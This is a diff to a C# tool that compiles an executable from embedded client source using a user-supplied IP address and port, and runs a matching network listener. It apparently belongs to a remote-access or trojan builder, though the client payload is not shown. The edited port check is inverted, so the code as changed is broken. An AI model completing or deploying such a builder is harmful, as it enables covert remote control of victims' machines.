@@ -9,6 +9,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Reflection;
 using System.Resources;
 using System.Security.Cryptography;
 using System.Text;
@@ -44,7 +45,12 @@ namespace PR0T0TYP3
 			//Build an exe
 			String port = portText.Text;
 			String ipAddress = ipOrDns.Text;
-			String clientCode = @""; //I will add the actual code here l8r
+
+			var assembly = Assembly.GetExecutingAssembly();
+
+			Stream stream = assembly.GetManifestResourceStream("PR0T0TYP3.Client.txt");
+			StreamReader reader = new StreamReader(stream);
+			String clientCode = reader.ReadToEnd();
 
 			saveFile.Filter = "exe files (*.exe)|.exe";
 			saveFile.Title = "Save the .exe File";
@@ -62,17 +68,18 @@ namespace PR0T0TYP3
 
 			System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
 			parameters.ReferencedAssemblies.Add("System.IO.dll");
-			parameters.ReferencedAssemblies.Add("System.Security.Cryptography.dll");
+			parameters.ReferencedAssemblies.Add("System.Security.dll");
 			parameters.ReferencedAssemblies.Add("System.dll");
 			parameters.ReferencedAssemblies.Add("System.Net.dll");
-			parameters.ReferencedAssemblies.Add("System.Resources.dll");
+			parameters.ReferencedAssemblies.Add("System.Linq.dll");
+			parameters.ReferencedAssemblies.Add("System.Reflection.dll");
 			parameters.ReferencedAssemblies.Add("System.Collections.dll");
 
 			parameters.EmbeddedResources.Add("temp.resources");
 
 			parameters.GenerateExecutable = true;
 			parameters.OutputAssembly = fileDownName;
-			CompilerResults results = icc.CompileAssemblyFromSource(parameters, ""); //Add stuff l8r
+			CompilerResults results = icc.CompileAssemblyFromSource(parameters, clientCode); //Add stuff l8r
 			if (results.Errors.Count > 0)
 			{
 				// Display compilation errors.
@@ -93,12 +100,12 @@ namespace PR0T0TYP3
 		{
 			int count = 0;
 			Listener listener = new Listener();
-			int portToListen = Convert.ToInt32(portListenText.Text);
 			IPAddress myIP = GetExternalIPAddress();
 			IPAddress localHost = GetLocalIPAddress();
 
-			if (String.IsNullOrEmpty(portToListen.ToString()))
+			if (String.IsNullOrEmpty(portListenText.Text))
 			{
+				int portToListen = Convert.ToInt32(portListenText.Text);
 				if (localBox.Checked)
 				{
 					listener.port = portToListen;
